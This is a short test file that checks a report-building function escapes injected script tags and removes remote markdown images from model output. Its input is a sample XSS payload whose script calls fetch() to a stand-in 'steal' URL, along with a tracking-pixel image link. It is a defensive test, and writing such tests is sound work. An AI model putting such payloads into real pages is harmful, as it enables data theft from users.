import { describe, expect, it } from 'vitest';
import { buildReportHtml } from '@/lib/report-delivery';

describe('report PDF HTML isolation', () => {
  it('escapes raw model HTML and omits remote markdown images', async () => {
    const html = await buildReportHtml(
      '<script>fetch("https://example.invalid/steal")</script>\n![secret](https://example.invalid/pixel)',
      'private resume',
      [{ speaker: 'USER', content: 'private transcript', timestamp_offset_ms: 0 }]
    );

    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('[Image omitted: secret]');
  });
});
